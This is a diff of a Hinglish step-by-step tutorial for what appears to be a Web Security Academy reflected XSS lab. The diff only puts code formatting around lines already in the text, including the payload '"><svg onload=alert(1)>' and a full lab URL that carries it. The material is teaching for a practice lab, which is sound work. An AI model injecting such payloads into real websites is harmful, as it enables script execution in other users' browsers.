@@ -17,7 +17,7 @@ Jaise:
 🔹 Step 3: Inspect Element karo (Right-click > Inspect)
 Dekho tumhara "test123" kaha gaya hai. Tum dekhoge kuch aisa:
 
-<img src="/image?query=test123">
+```<img src="/image?query=test123">```
 
 ---
 
@@ -28,7 +28,7 @@ Ab humein src attribute se bahar nikalna hai, aur apna script inject karna hai.
 
 🔸 Final payload (tum URL mein daalo):
 
-?search="><svg onload=alert(1)>
+```?search="><svg onload=alert(1)>```
 
 🔹 Full URL ka example:
 Agar tumhari lab URL hai:
@@ -37,7 +37,7 @@ Agar tumhari lab URL hai:
 
 Toh final payload wala URL hoga:
 
-https://acde1f123.web-security-academy.net/?search="><svg onload=alert(1)>
+```https://acde1f123.web-security-academy.net/?search="><svg onload=alert(1)>```
 
 🔹 Step 5: Open that URL
 
